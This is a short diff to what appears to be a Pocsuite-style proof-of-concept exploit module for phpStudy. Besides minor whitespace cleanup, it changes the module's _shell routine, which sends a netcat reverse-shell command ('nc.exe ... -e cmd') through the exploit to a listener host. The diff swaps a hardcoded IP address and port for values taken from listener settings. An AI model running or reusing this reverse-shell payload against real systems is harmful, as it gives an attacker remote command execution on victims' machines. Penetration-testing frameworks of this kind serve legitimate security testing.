@@ -71,7 +71,6 @@ class PhpstudyPoc(POCBase):
 
         result = requests.get(self.url, headers=headers)
 
-
         return result
 
     # 漏洞的核心方法
@@ -125,17 +124,14 @@ class PhpstudyPoc(POCBase):
         return self.parse_output(result)
 
     def _shell(self):
-        pss = "nc.exe 192.168.124.104 6666 -e cmd"
+        cmd = f"nc.exe {get_listener_ip()} {get_listener_port()} -e cmd"
         try:
-            result = self.exploit(pss)
+            result = self.exploit(cmd)
             print(result)
         except Exception:
             pass
         else:
             return self.parse_output(result)
-
-
-
 
 # 注册 DemoPOC 类
 register_poc(PhpstudyPoc)
